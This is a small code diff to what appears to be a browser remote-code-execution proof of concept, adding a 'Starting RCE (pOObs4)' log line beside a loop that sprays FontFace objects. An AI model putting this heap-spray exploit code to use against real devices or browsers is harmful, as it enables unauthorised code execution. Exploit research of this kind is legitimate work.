@@ -18,6 +18,8 @@ function poc() {
 
     var bad_fonts = [];
 
+    logMessage("Starting RCE (pOObs4)...");
+
     for (var i = 0; i < SPRAY_FONTS; i++)
         bad_fonts.push(new FontFace("font1", "", {}));
 
